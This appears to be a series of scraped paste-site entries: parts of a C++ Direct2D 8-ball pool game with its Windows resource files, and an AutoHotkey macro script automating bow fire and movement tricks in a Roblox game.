            tip = D2D1::Point2F(targetPocketCenter.x, targetPocketCenter.y - verticalOffsetFromPocketCenter - arrowHeadSize);
            baseLeft = D2D1::Point2F(targetPocketCenter.x - arrowHeadSize / 2.0f, targetPocketCenter.y - verticalOffsetFromPocketCenter);
            baseRight = D2D1::Point2F(targetPocketCenter.x + arrowHeadSize / 2.0f, targetPocketCenter.y - verticalOffsetFromPocketCenter);
            shaftTopLeft = D2D1::Point2F(targetPocketCenter.x - arrowShaftWidth / 2.0f, baseLeft.y + arrowShaftLength);
            shaftTopRight = D2D1::Point2F(targetPocketCenter.x + arrowShaftWidth / 2.0f, baseRight.y + arrowShaftLength);
            shaftBottomLeft = D2D1::Point2F(targetPocketCenter.x - arrowShaftWidth / 2.0f, baseLeft.y);
            shaftBottomRight = D2D1::Point2F(targetPocketCenter.x + arrowShaftWidth / 2.0f, baseRight.y);
        }

        ID2D1PathGeometry* pPath = nullptr;
        if (SUCCEEDED(pFactory->CreatePathGeometry(&pPath))) {
            ID2D1GeometrySink* pSink = nullptr;
            if (SUCCEEDED(pPath->Open(&pSink))) {
                pSink->BeginFigure(tip, D2D1_FIGURE_BEGIN_FILLED);
                pSink->AddLine(baseLeft); pSink->AddLine(shaftBottomLeft); pSink->AddLine(shaftTopLeft);
                pSink->AddLine(shaftTopRight); pSink->AddLine(shaftBottomRight); pSink->AddLine(baseRight);
                pSink->EndFigure(D2D1_FIGURE_END_CLOSED);
                pSink->Close();
                SafeRelease(&pSink);
                pRT->FillGeometry(pPath, pArrowBrush);
            }
            SafeRelease(&pPath);
        }
        SafeRelease(&pArrowBrush);
    }
```
 
==++ Here's the full source for (file 2/3 (No OOP-based)) ""resource.h""::: ++==
```resource.h
//{{NO_DEPENDENCIES}}
// Microsoft Visual C++ generated include file.
// Used by Yahoo-8Ball-Pool-Clone.rc
//
#define IDI_ICON1                       101
// --- NEW Resource IDs (Define these in your .rc file / resource.h) ---
#define IDD_NEWGAMEDLG 106
#define IDC_RADIO_2P   1003
#define IDC_RADIO_CPU  1005
#define IDC_GROUP_AI   1006
#define IDC_RADIO_EASY 1007
#define IDC_RADIO_MEDIUM 1008
#define IDC_RADIO_HARD 1009
// --- NEW Resource IDs for Opening Break ---
#define IDC_GROUP_BREAK_MODE 1010
#define IDC_RADIO_CPU_BREAK  1011
#define IDC_RADIO_P1_BREAK   1012
#define IDC_RADIO_FLIP_BREAK 1013
// Standard IDOK is usually defined, otherwise define it (e.g., #define IDOK 1)
 
// Next default values for new objects
// 
#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
#define _APS_NEXT_RESOURCE_VALUE        102
#define _APS_NEXT_COMMAND_VALUE         40002 // Incremented
#define _APS_NEXT_CONTROL_VALUE         1014 // Incremented
#define _APS_NEXT_SYMED_VALUE           101
#endif
#endif
 
```
 
==++ Here's the full source for (file 3/3 (No OOP-based)) ""Yahoo-8Ball-Pool-Clone.rc""::: ++==
```Yahoo-8Ball-Pool-Clone.rc
// Microsoft Visual C++ generated resource script.
//
#include ""resource.h""
 
#define APSTUDIO_READONLY_SYMBOLS
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 2 resource.
//
#include ""winres.h""
 
/////////////////////////////////////////////////////////////////////////////
#undef APSTUDIO_READONLY_SYMBOLS
 
/////////////////////////////////////////////////////////////////////////////
// English (United States) resources
 
#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US
#pragma code_page(1252)
 
#ifdef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// TEXTINCLUDE
//
 
1 TEXTINCLUDE 
BEGIN
    ""resource.h\0""
END
 
2 TEXTINCLUDE 
BEGIN
    ""#include """"winres.h""""\r\n""
    ""\0""
END
 
3 TEXTINCLUDE 
BEGIN
    ""\r\n""
    ""\0""
END
 
#endif    // APSTUDIO_INVOKED
 
 
/////////////////////////////////////////////////////////////////////////////
//
// Icon
//
 
// Icon with lowest ID value placed first to ensure application icon
// remains consistent on all systems.
IDI_ICON1               ICON                    ""D:\\Download\\cpp-projekt\\FuzenOp_SiloTest\\icons\\shell32_277.ico""
 
#endif    // English (United States) resources
/////////////////////////////////////////////////////////////////////////////
 
 
 
#ifndef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 3 resource.
//
 
 
/////////////////////////////////////////////////////////////////////////////
#endif    // not APSTUDIO_INVOKED
 
#include <windows.h> // Needed for control styles like WS_GROUP, BS_AUTORADIOBUTTON etc.
 
/////////////////////////////////////////////////////////////////////////////
//
// Dialog
//
 
IDD_NEWGAMEDLG DIALOGEX 0, 0, 220, 185 // Dialog position (x, y) and size (width, height) in Dialog Units (DLUs) - Increased Height
STYLE DS_SETFONT | DS_MODALFRAME | DS_FIXEDSYS | WS_POPUP | WS_CAPTION | WS_SYSMENU
CAPTION ""New 8-Ball Game""
FONT 8, ""MS Shell Dlg"", 400, 0, 0x1 // Standard dialog font
BEGIN
// --- Game Mode Selection ---
// Group Box for Game Mode (Optional visually, but helps structure)
GROUPBOX        ""Game Mode"", IDC_STATIC, 7, 7, 90, 50
 
// ""2 Player"" Radio Button (First in this group)
CONTROL         ""&2 Player (Human vs Human)"", IDC_RADIO_2P, ""Button"",
BS_AUTORADIOBUTTON | WS_GROUP | WS_TABSTOP, 14, 20, 80, 10
 
// ""Human vs CPU"" Radio Button
CONTROL         ""Human vs &CPU"", IDC_RADIO_CPU, ""Button"",
BS_AUTORADIOBUTTON | WS_TABSTOP, 14, 35, 70, 10
 
 
// --- AI Difficulty Selection (Inside its own Group Box) ---
GROUPBOX        ""AI Difficulty"", IDC_GROUP_AI, 118, 7, 95, 70
 
// ""Easy"" Radio Button (First in the AI group)
CONTROL         ""&Easy"", IDC_RADIO_EASY, ""Button"",
BS_AUTORADIOBUTTON | WS_GROUP | WS_TABSTOP, 125, 20, 60, 10
 
// ""Medium"" Radio Button
CONTROL         ""&Medium"", IDC_RADIO_MEDIUM, ""Button"",
BS_AUTORADIOBUTTON | WS_TABSTOP, 125, 35, 60, 10
 
// ""Hard"" Radio Button
CONTROL         ""&Hard"", IDC_RADIO_HARD, ""Button"",
BS_AUTORADIOBUTTON | WS_TABSTOP, 125, 50, 60, 10
 
// --- Opening Break Modes (For Versus CPU Only) ---
GROUPBOX        ""Opening Break Modes:"", IDC_GROUP_BREAK_MODE, 118, 82, 95, 60
 
// ""CPU Break"" Radio Button (Default for this group)
CONTROL         ""&CPU Break"", IDC_RADIO_CPU_BREAK, ""Button"",
BS_AUTORADIOBUTTON | WS_GROUP | WS_TABSTOP, 125, 95, 70, 10
 
// ""P1 Break"" Radio Button
CONTROL         ""&P1 Break"", IDC_RADIO_P1_BREAK, ""Button"",
BS_AUTORADIOBUTTON | WS_TABSTOP, 125, 110, 70, 10
 
// ""FlipCoin Break"" Radio Button
CONTROL         ""&FlipCoin Break"", IDC_RADIO_FLIP_BREAK, ""Button"",
BS_AUTORADIOBUTTON | WS_TABSTOP, 125, 125, 70, 10
 
 
// --- Standard Buttons ---
DEFPUSHBUTTON   ""Start"", IDOK, 55, 160, 50, 14 // Default button (Enter key) - Adjusted Y position
PUSHBUTTON      ""Cancel"", IDCANCEL, 115, 160, 50, 14 // Adjusted Y position
END
 
```"
h2bXZGgd,11/07/2025 CW Macro AHK,nicebruh,Autohotkey,Friday 11th of July 2025 01:36:16 PM CDT,"; WARNING: Messing with the content below can break the script.
; Scroll down to the bottom to find the binds for the macros.

{ ; AHK script settings. (DO NOT TOUCH)

    SetWorkingDir %A_ScriptDir%
    SetTitleMatchMode 2
    SetControlDelay 0
    SetWinDelay 0
    SetKeyDelay -1
    SetMouseDelay -1
    SetBatchLines -1
    SendMode, Event
    #IfWinActive Roblox

    { ; Set this value to anything that you've tested works with your roblox sensitivity

        global DefaultValue = 2285

    }

	global NirCmdPath = A_ScriptDir ""\nircmd.exe""
	global ScriptPath = A_ScriptDir
	global SuperJumpSpinRan = 0
    global loopIndex = 0
    global SuperJumpCooldown = 0
    global GuiUsed = 0
    global SlideAllowed = 0
    global SuperThrowRun = 0
    global ReloadMacrosRun = 0
    global AutoFireToggler = 0
    global CurrentBow = 0
    global InputField = 2285
    global Scaled = 0
    global IsRunning = 0
    global UsingItem1 = 0
    global XInt = DefaultValue
    global YInt = 305
    global ScaledX = Round(XInt * 1.375492341)
    global ScaledY = Round(YInt * 4.327868852)
    global ChargeJump = 0
    global ChainsawMode = 0
    SetTimer, ReleaseKeys, -10
    Sleep, 100
    SetTimer, ReleaseKeys, Off
	SetTimer, NirCmdCheck, 1

}

{ ; Essential script control macros.

	NirCmdCheck()
	{
		If (FileExist(NirCmdPath))
		{
			SetTimer, NirCmdCheck, Off
		}
		Else
		{
			MsgBox, NirCmd was not found; Contact mudbourn for help on Discord.
			MsgBox, %ScriptPath%
			SetTimer, NirCmdCheck, Off
		}
	}

	IsRobloxActive()
	{
		WinGetTitle, title, A
		return InStr(title, ""Roblox"")
		return
	}


	~F5::Pause

	ChatCancel()
	{
		While GetKeyState(""/"", ""U"")
		{
			if GetKeyState(""/"", ""P"")
			{
				Send, {Esc}
				return
			}
		}
		return
	}

	~*=::
	Suspend, Permit
	if GetKeyState(""LAlt"", ""P"")
	{
		Run ""C:\Program Files\AutoHotkey\SciTE\SciTE.exe"" ""%A_ScriptFullPath%""
		return
	}
	SetTimer, ChatCancel, 1
	SoundPlay, beep.mp3
	ReloadMacros()
	return

	ReloadMacros()
	{
		Soundplay, beep.mp3
		Sleep, 100
		if UsingItem1 = 1
		{
			Flourish1()
		}
		SetTimer, ChatCancel, Off
		Reload
		return
	}

	~*/::
	SusOn:
	Suspend, Permit
	Suspend, On
	Return

	~*Esc::
	SusTog:
	Suspend, Permit
	Suspend, Toggle
	Send, {Esc}
	Return

	~*Enter::
	SusOff:
	Suspend, Permit
	Suspend, Off
	Return

	ReleaseKeys:
	SetTimer, ChatCancel, 1
	Send, {w up}{a up}{s up}{d up}{Shift up}{Ctrl up}{Alt up}{Space up}{LButton up}{RButton up}{C Up}{X Up}{O Up}{R Up}
	Send, {Esc}
	Sleep, 50
	Send, {Esc}
	Sleep, 5
	SetTimer, ReleaseKeys, Off
	SetTimer, ChatCancel, Off
	return

}

{ ; Main macros.

{ ; Bow Auto Fire

	AutoFireBow()
	{
		If (FileExist(nircmdPath))
		{
			if CurrentBow != -1
			{
				if UsingItem1 = 1
				{
					if  AutoFireToggler = 0
					{
						SetTimer, AutoFireMechanic, 2
						Loop, 5
						{
							Send, {LButton}{RButton}
						}
						Soundplay, beep.mp3
					}
					else if  AutoFireToggler = 1
					{
						SetTimer, AutoFireKillSwitch, 1
					}
				}
				else if UsingItem1 = 0
				{
					Return
				}
			}
			Return
		}
		Else
		{
			MsgBox, NirCmd was not found; Contact mudbourn for help on discord.
			MsgBox, Active Directory: A_ScriptDir
		}
	}

	AutoFireMechanic()
	{
		if CurrentBow = 0
		{
			MsgBox You have not selected a bow. Press ""]"" to select one.
			AutoFireToggler = 0
			SetTimer,  AutoFireMechanic, Off
		}
		else if CurrentBow = 1
		{
			AutoFireToggler = 1
			SetTimer, Longbow, -1
			SetTimer,  AutoFireMechanic, Off
		}
		else if CurrentBow = 2
		{
			AutoFireToggler = 1
			SetTimer, CrossBow, -1
			SetTimer,  AutoFireMechanic, Off
		}
		else if CurrentBow = 3
		{
			AutoFireToggler = 1
			SetTimer, HeavyBow, -1
			SetTimer,  AutoFireMechanic, Off
		}
		Return
	}

	Longbow()
	{
		While UsingItem1 = 1 && AutoFireToggler = 1
		{
			Send, {LButton Down}
			Sleep, 20
			Send, {F}
			Sleep, 480
			Send, {LButton Up}
			Sleep, 5
			Send, {R}
			Sleep, 750
		}
		Send, {R Down}
		Sleep, 10
		SetTimer, AutoFireKillSwitch, 1
	}

	CrossBow()
	{
		While UsingItem1 = 1 && AutoFireToggler = 1
		{
			Send,{LButton}
			Sleep, 10
			Send, {R}{F}
			Sleep, 1275
		}
		Send, {R Down}
		Sleep, 10
		SetTimer, AutoFireKillSwitch, 1
	}

	HeavyBow()
	{
		Send, {F}
		Sleep, 100
		While UsingItem1 = 1 && AutoFireToggler = 1
		{
			Send, {LButton Down}
			Sleep, 20
			Send, {F}
			Sleep, 755
			Send, {LButton Up}
			Sleep, 5
			Send, {R}
			Sleep, 1450
		}
		Send, {R}
		Sleep, 10
		SetTimer, AutoFireKillSwitch, 1
	}

	AutoFireKillSwitch()
	{
		AutoFireToggler = 0
		SetTimer, ReleaseKeys, 1
		SetTimer, HeavyBow, Off
		SetTimer, Crossbow, Off
		SetTimer, Longbow, Off
		SetTimer, AutoFireKillSwitch, Off
	}

}

{ ; Super Jump

SuperJump()
{
	if (SuperJumpCooldown = 0)
	{
		SuperJumpCooldown = 1
		loopIndex = 0
		If GetKeyState(""x"", ""P"")
		{
			ChargeJump = 1
			Send, {C}
			Send, {C Down}
			Sleep, 15
			Send, {Space Down}
			Sleep, 300
			Send, {Space Up}{C Up}
			Sleep, 10
			SetTimer,  SuperJumpGlitch, -1
			Return
		}
		; Otherwise
		SetTimer,  SuperJumpGlitch, -1
		Return
	}
	Return
}

SuperJumpGlitch()
{
	SuperJumpSpinRan = 0
	if GetKeyState(""W"", ""P"") or GetKeyState(""LShift"", ""P"")
	{
		IsRunning = 1
		Sleep, 30
	}
	if IsRunning = 0
	{
		Send, {LShift Down}
		Sleep, 10
		Send, {W Down}
		Sleep, 30
	}
	Send, {Space}
	Loop, 2
	{
		DllCall(""user32.dll\mouse_event"", ""UInt"", 0x0001, ""Int"", 0, ""Int"", 1400)
		Sleep, 2
	}
	Send, {E}
	Sleep, 45
	SetTimer, SuperJumpSpin, 1
	SetTimer, SuperJumpSlide, 20
	Sleep, 500
	If IsRunning = 0
	{
		Send, {W Up}{LShift Up}
	}
	Sleep, 10
	SlideAllowed = 1
	Sleep, 1500
	SlideAllowed = 0
	SuperJumpCooldown = 0
	IsRunning = 0
	SetTimer, SuperJumpSlide, Off
	SetTimer, SuperJumpGlitch, Off
}

SuperJumpSpin()
{
	Critical, On
	SuperJumpSpinRan = 1
	loopIndex++
	Sleep, -1
	Send, {Space Down}
	DllCall(""user32.dll\mouse_event"", ""UInt"", 0x0001, ""Int"", XInt, ""Int"", YInt)
	if (loopIndex >= 34)
	{
		ResetCamera = 1
		Send, {Space Up}
		loopIndex = 0
		Sleep, 30
		DllCall(""user32.dll\mouse_event"", ""UInt"", 0x0001, ""Int"", -ScaledX, ""Int"", -ScaledY)
		SetTimer, SuperJumpSpin, Off
	}
	Return
}

SuperJumpSlide()
{
	if SlideAllowed = 1
	{
		While GetKeyState(""Z"", ""P"") && SlideAllowed = 1
		{
			Sliding = 1
			Sleep, 5
			Send, {LShift Down}
			Sleep, 50
			Send, {W Down}
			Sleep, 50
			Send, {C Down}
			ResetCamera = 0
		}
		if Sliding = 1
		{
			Send, {LShift Up}{W}{C Up}
			SetTimer, SuperJumpSlide, Off
		}
		Return
	}
}

}

{ ; Super Throw

SuperThrow()
{
	Critical, Off
	SuperThrowRun = 1
	While SuperThrowRun = 1
	{
		DllCall(""user32.dll\mouse_event"", ""UInt"", 0x0001, ""Int"", 0, ""Int"", 1700)
		Send, {Z}
		Sleep, 15
		Send, {C Down}
		Sleep, 15
		Send, {Space Down}{X Down}
		MouseMove, 736, 564, 26
		Sleep, 450
		Send, {Space Up}
		Sleep, 15
		SetTimer, SuperThrowSpin, 2
		Sleep, 5
		Send, {Z Up}{C Up}{Space Up}
		Sleep, 10
		Send, {Z}
		Sleep, 10
		global SuperThrowRun = 0
		SetTimer, SuperThrow, Off
		Return
	}
}

SuperThrowSpin()
{
	Send, {X Up}
	Sleep, 30
	Loop, 5
	{
		MouseMove, 754, 527, 30
		Sleep, 2
		MouseMove, 801, 496, 30
		Sleep, 2
		MouseMove, 855, 510, 29
		Sleep, 2
		MouseMove, 873, 565, 28
		Sleep, 2
		MouseMove, 847, 618, 28
		Sleep, 2
		MouseMove, 801, 642, 28
		Sleep, 2
		MouseMove, 754, 606, 27
		Sleep, 2
		MouseMove, 736, 564, 27
		Sleep, 2
	}
	SetTimer, SuperThrowSpin, Off
	Return
}

Bail()
{
	if GetKeyState(""LButton"", ""P"")
	{
		Send, {Z}
		Sleep, 15
		ReloadMacros()
	}
}

}

{ ; Tricks

Scaler()
{
	 if Scaled = 0
	{
		Scaled = 1
		Run, nircmd.exe setdisplay 1600 900 32
	}
	else if Scaled = 1
	{
		Scaled = 0
		Run, nircmd.exe setdisplay 1920 1080 32
	}
}

Flourish1()
{
	If UsingItem1 = 0
    {
        UsingItem1 = 1
    }
    else if UsingItem1 = 1
    {
        UsingItem1 = 0
    }
    Send, {1 Down}
	Sleep, 3
	Send, {X Down}
	Send, {1 Up}{X Up}
	return
}

Flourish2()
{
	Send, {2 down}
	Sleep, 50
	send, {x down}
	Send, {2 up}
	send, {x up}
	return
}

Flourish3()
{
	Send, {3 down}
	Sleep, 50
	send, {x down}
	Send, {3 up}
	send, {x up}
	return
}

GKCancel()
{
	Send, {G}
	Sleep, 300
	Send, {Q}
	Return
}

FakeSwing()
{
	While GetKeyState(""XButton2"", ""P"")
	{
		if ChainsawMode = 0
		{
			Send, {LButton}
			Sleep, 142
			Send, {x}
			Sleep, 540
		}
		else if ChainsawMode = 1
		{
			SetTimer, ChainSawGlitchFlick, -1
		}
	}
	Return
}

ChainSawGlitchFlick()
{
	Send, {LButton}
	Loop, 1
	{
		DllCall(""user32.dll\mouse_event"", ""UInt"", 0x0001, ""Int"", 500, ""Int"", 0)
		Sleep, 33
		DllCall(""user32.dll\mouse_event"", ""UInt"", 0x0001, ""Int"", -500, ""Int"", 0)
		Sleep, 33
		DllCall(""user32.dll\mouse_event"", ""UInt"", 0x0001, ""Int"", -500, ""Int"", 0)
		Sleep, 33
		DllCall(""user32.dll\mouse_event"", ""UInt"", 0x0001, ""Int"", 500, ""Int"", 0)
		Sleep, 33
	}
}

}

}

{ ; Choices and settings menu for certain macros.

	Settings()
	{
		Gui, New, +AlwaysOnTop +OwnDialogs, Choose an Option
		Gui, Add, Text, Center, Settings
		Gui, Add, Button, gChooseA1 w175 Center, Bow Type Selector
		Gui, Add, Button, gChooseB2 w175 Center, Fix AutoFire Hotkey
		Gui, Add, Button, gChooseC3 w175 Center, Disable AutoFire Hotkey
		Gui, Add, Button, gChooseD4 w175 Center, Super Jump Spin
		Gui, Add, Button, gChooseE5 w175 Center, Chainsaw Glitch
		Gui, Show, w300, Made by mudbourn.
		Return
	}

	BowSelector()
	{
		Gui, New, +AlwaysOnTop +OwnDialogs, Choose an Option
		Gui, Add, Text, Center, Please select your current bow type
		Gui, Add, Button, gChooseA w175 Center, LongBow
		Gui, Add, Button, gChooseB w175 Center, Crossbow
		Gui, Add, Button, gChooseC w175 Center, Heavy Bow
		Gui, Show, w300, Made by mudbourn.
		Return
	}

	SpinSpeedSetting()
	{
		Gui, Add, Text, Center, Enter a spin speed :
		if GuiUsed = 0
		{
			GuiUsed = 1
			Gui, Add, Edit, vInputField 175
		}
		else if GuiUsed = 1
		{
		}
		Gui, Add, Button, gSubmitInput Center, Submit
		Gui, Show, w300, Made by mudbourn.
		return
	}

	FixAutoFireToggle()
	{
		Gui, New, +AlwaysOnTop +OwnDialogs, Choose an Option
		Gui, Add, Text, Center, Is your bow equipped?
		Gui, Add, Button, gChoose1 w175 Center, Yes
		Gui, Add, Button, gChoose2 w175 Center, No
		Gui, Show, w300, Made by mudbourn.
		return
	}

	ChooseA1:
	{
		Gui, Destroy
		BowSelector()
		Return
	}

	ChooseB2:
	{
		Gui, Destroy
		FixAutoFireToggle()
		Return
	}

	ChooseC3:
	{
		Gui, Destroy
		CurrentBow = -1
		Return
	}

	ChooseD4:
	{
		Gui, Destroy
		SpinSpeedSetting()
		Return
	}

	ChooseE5:
	{
		Gui, Destroy
		if ChainsawMode = 0
		{
			ChainsawMode = 1
			MsgBox Chainsaw Glitch Enabled
		}
		else if ChainsawMode = 1
		{
			ChainsawMode = 0
			MsgBox Chainsaw Glitch Disabled
		}
		return
	}

	SubmitInput:
	{
		Gui, Submit  ; Save the GUI's input to variables
		global XInt = InputField  ; Assign GUI input to global variablew
		if (Trim(XInt) = """" or Trim(XInt) < 1 or !RegExMatch(XInt, ""^\d+$""))
		{
			XInt = %DefaultValue%
			MsgBox, Invalid Speed; Set value to %XInt%.
			Return
		}
		if (Trim(XInt) > 2800)
		{
			MsgBox, (WARNING)`n`nThis value is much higher than the deafult and may cause problems.
			Return
		}
				if (Trim(XInt) < 1800 )
		{
			MsgBox, (WARNING)`n`nThis value is much lower than the default and may cause problems.
			Return
		}
		MsgBox, Your spin speed is now: %XInt%
		return
	}

	ChooseA:
	{
		Gui, Destroy
		GuiClose1:
		GuiEscape1:
			CurrentBow = 1
			if CurrentBow = 1
			{
				MsgBox Your choice has been saved as ""1""
				SetTimer, AutoFireKillSwitch, 1
			}
		Return
	}

	ChooseB:
	{
		Gui, Destroy
		GuiClose2:
		GuiEscape2:
			CurrentBow = 2
			if CurrentBow = 2
			{
				MsgBox Your choice has been saved as ""2""
				SetTimer, AutoFireKillSwitch, 1
			}
		Return
	}

	ChooseC:
	{
		Gui, Destroy
		GuiClose3:
		GuiEscape3:
			CurrentBow = 3
			if CurrentBow = 3
			{
				MsgBox Your choice has been saved as ""3""
				SetTimer, AutoFireKillSwitch, 1
			}
		Return
	}

	Choose1:
	{
			Gui, Destroy
			Send, {1}
			SetTimer, AutoFireKillSwitch, 1
			CurrentBow = 0
			UsingItem1 = 0
			Return
	}

	Choose2:
	{
		Gui, Destroy
		SetTimer, AutoFireKillSwitch, 1
		CurrentBow = 0
		UsingItem1 = 0
		Return
	}
}

{ ; Binds required for certain macros.

v::z

z::v

*1::Flourish1()
}

{ ; Optional extra macros.

2::Flourish2()

3::Flourish3()

}

{ ; Feel free to change these binds at will.

~b::AutoFireBow()

~*XButton2::FakeSwing()

*XButton1::SuperJump()

+q::GKCancel()

j::SuperThrow()

~*]::Settings()

{ ; Remove this if you do not have NirCmd
~*F8::Scaler()
}

; (Note: ""~"" stops the macro from cancelling the key's proper output and  ""*""  allows the macros to run regardless of the modifier keys that are being held.)

}"
rAxnTJVG,2D StickPool Game C++ (Multi-Colored Balls Realistically),alien_fx_fiend,C++,Friday 11th of July 2025 01:20:00 PM CDT,"==++ Here's the full source code for (File 1\3) ""Pool-Game-CloneV18.cpp""::: ++==
```""Pool-Game-CloneV18.cpp""
    #define WIN32_LEAN_AND_MEAN
    #define NOMINMAX
    #include <windows.h>
    #include <d2d1.h>
    #include <dwrite.h>
    #include <fstream> // For file I/O
    #include <iostream> // For some basic I/O, though not strictly necessary for just file ops
    #include <vector>
    #include <cmath>
    #include <string>
    #include <sstream> // Required for wostringstream
    #include <algorithm> // Required for std::max, std::min
    #include <ctime>    // Required for srand, time
    #include <cstdlib> // Required for srand, rand (often included by others, but good practice)
    #include <commctrl.h> // Needed for radio buttons etc. in dialog (if using native controls)
    #include <mmsystem.h> // For PlaySound
    #include <tchar.h> //midi func
    #include <thread>
    #include <atomic>
    #include ""resource.h""

    #ifndef HAS_STD_CLAMP
    template <typename T>
    T clamp(const T& v, const T& lo, const T& hi)
    {
        return (v < lo) ? lo : (v > hi) ? hi : v;
    }
    namespace std { using ::clamp; }   // inject into std:: for seamless use
    #define HAS_STD_CLAMP
    #endif

    #pragma comment(lib, ""Comctl32.lib"") // Link against common controls library
    #pragma comment(lib, ""d2d1.lib"")
    #pragma comment(lib, ""dwrite.lib"")
    #pragma comment(lib, ""Winmm.lib"") // Link against Windows Multimedia library

    // --- Constants ---
    const float PI = 3.1415926535f;
    const float BALL_RADIUS = 10.0f;
    const float TABLE_LEFT = 100.0f;
    const float TABLE_TOP = 100.0f;
    const float TABLE_WIDTH = 700.0f;
    const float TABLE_HEIGHT = 350.0f;
    const float TABLE_RIGHT = TABLE_LEFT + TABLE_WIDTH;
    const float TABLE_BOTTOM = TABLE_TOP + TABLE_HEIGHT;
    const float CUSHION_THICKNESS = 20.0f;
    const float HOLE_VISUAL_RADIUS = 22.0f; // Visual size of the hole
    const float POCKET_RADIUS = HOLE_VISUAL_RADIUS * 1.05f; // Make detection radius slightly larger // Make detection radius match visual size (or slightly larger)
    const float MAX_SHOT_POWER = 15.0f;
    const float FRICTION = 0.985f; // Friction factor per frame
    const float MIN_VELOCITY_SQ = 0.01f * 0.01f; // Stop balls below this squared velocity
    const float HEADSTRING_X = TABLE_LEFT + TABLE_WIDTH * 0.30f; // 30% line
    const float RACK_POS_X = TABLE_LEFT + TABLE_WIDTH * 0.65f; // 65% line for rack apex
    const float RACK_POS_Y = TABLE_TOP + TABLE_HEIGHT / 2.0f;
    const UINT ID_TIMER = 1;
    const int TARGET_FPS = 60; // Target frames per second for timer

    // --- Enums ---
    // --- MODIFIED/NEW Enums ---
    enum GameState {
        SHOWING_DIALOG,     // NEW: Game is waiting for initial dialog input
        PRE_BREAK_PLACEMENT,// Player placing cue ball for break
        BREAKING,           // Player is aiming/shooting the break shot
        CHOOSING_POCKET_P1, // NEW: Player 1 needs to call a pocket for the 8-ball
        CHOOSING_POCKET_P2, // NEW: Player 2 needs to call a pocket for the 8-ball
        AIMING,             // Player is aiming
        AI_THINKING,        // NEW: AI is calculating its move
        SHOT_IN_PROGRESS,   // Balls are moving
        ASSIGNING_BALLS,    // Turn after break where ball types are assigned
        PLAYER1_TURN,
        PLAYER2_TURN,
        BALL_IN_HAND_P1,
        BALL_IN_HAND_P2,
        GAME_OVER
    };

    enum BallType {
        NONE,
        SOLID,  // Yellow (1-7)
        STRIPE, // Red (9-15)
        EIGHT_BALL, // Black (8)
        CUE_BALL // White (0)
    };

    // NEW Enums for Game Mode and AI Difficulty
    enum GameMode {
        HUMAN_VS_HUMAN,
        HUMAN_VS_AI
    };

    enum AIDifficulty {
        EASY,
        MEDIUM,
        HARD
    };

    enum OpeningBreakMode {
        CPU_BREAK,
        P1_BREAK,
        FLIP_COIN_BREAK
    };

    // --- Structs ---
    struct Ball {
        int id;             // 0=Cue, 1-7=Solid, 8=Eight, 9-15=Stripe
        BallType type;
        float x, y;
        float vx, vy;
        D2D1_COLOR_F color;
        bool isPocketed;
    };

    struct PlayerInfo {
        BallType assignedType;
        int ballsPocketedCount;
        std::wstring name;
    };

    // --- Global Variables ---

    // Direct2D & DirectWrite
    ID2D1Factory* pFactory = nullptr;
    //ID2D1Factory* g_pD2DFactory = nullptr;
    ID2D1HwndRenderTarget* pRenderTarget = nullptr;
    IDWriteFactory* pDWriteFactory = nullptr;
    IDWriteTextFormat* pTextFormat = nullptr;
    IDWriteTextFormat* pLargeTextFormat = nullptr; // For ""Foul!""

    // Game State
    HWND hwndMain = nullptr;
    GameState currentGameState = SHOWING_DIALOG; // Start by showing dialog
    std::vector<Ball> balls;
    int currentPlayer = 1; // 1 or 2
    PlayerInfo player1Info = { BallType::NONE, 0, L""Vince Woods""/*""Player 1""*/ };
    PlayerInfo player2Info = { BallType::NONE, 0, L""Virtus Pro""/*""CPU""*/ }; // Default P2 name
    bool foulCommitted = false;
    std::wstring gameOverMessage = L"""";
    bool firstBallPocketedAfterBreak = false;
    std::vector<int> pocketedThisTurn;
    // --- NEW: 8-Ball Pocket Call Globals ---
    int calledPocketP1 = -1; // Pocket index (0-5) called by Player 1 for the 8-ball. -1 means not called.
    int calledPocketP2 = -1; // Pocket index (0-5) called by Player 2 for the 8-ball.
    int currentlyHoveredPocket = -1; // For visual feedback on which pocket is being hovered
    std::wstring pocketCallMessage = L""""; // Message like ""Choose a pocket...""
         // --- NEW: Remember which pocket the 8?ball actually went into last shot
    int lastEightBallPocketIndex = -1;
    //int lastPocketedIndex = -1; // pocket index (0–5) of the last ball pocketed
    int called = -1;
    bool cueBallPocketed = false;

    // --- NEW: Foul Tracking Globals ---
    int firstHitBallIdThisShot = -1;      // ID of the first object ball hit by cue ball (-1 if none)
    bool cueHitObjectBallThisShot = false; // Did cue ball hit an object ball this shot?
    bool railHitAfterContact = false;     // Did any ball hit a rail AFTER cue hit an object ball?
    // --- End New Foul Tracking Globals ---

    // NEW Game Mode/AI Globals
    GameMode gameMode = HUMAN_VS_HUMAN; // Default mode
    AIDifficulty aiDifficulty = MEDIUM; // Default difficulty
    OpeningBreakMode openingBreakMode = CPU_BREAK; // Default opening break mode
    bool isPlayer2AI = false;           // Is Player 2 controlled by AI?
    bool aiTurnPending = false;         // Flag: AI needs to take its turn when possible
    // bool aiIsThinking = false;       // Replaced by AI_THINKING game state
    // NEW: Flag to indicate if the current shot is the opening break of the game
    bool isOpeningBreakShot = false;

    // NEW: For AI shot planning and visualization
    struct AIPlannedShot {
        float angle;
        float power;
        float spinX;
        float spinY;
        bool isValid; // Is there a valid shot planned?
    };
    AIPlannedShot aiPlannedShotDetails; // Stores the AI's next shot
    bool aiIsDisplayingAim = false;    // True when AI has decided a shot and is in ""display aim"" mode
    int aiAimDisplayFramesLeft = 0;  // How many frames left to display AI aim
    const int AI_AIM_DISPLAY_DURATION_FRAMES = 45; // Approx 0.75 seconds at 60 FPS, adjust as needed

    // Input & Aiming
    POINT ptMouse = { 0, 0 };
    bool isAiming = false;
    bool isDraggingCueBall = false;
    // --- ENSURE THIS LINE EXISTS HERE ---
    bool isDraggingStick = false; // True specifically when drag initiated on the stick graphic
    // --- End Ensure ---
    bool isSettingEnglish = false;
    D2D1_POINT_2F aimStartPoint = { 0, 0 };
    float cueAngle = 0.0f;
    float shotPower = 0.0f;
    float cueSpinX = 0.0f; // Range -1 to 1
    float cueSpinY = 0.0f; // Range -1 to 1
    float pocketFlashTimer = 0.0f;
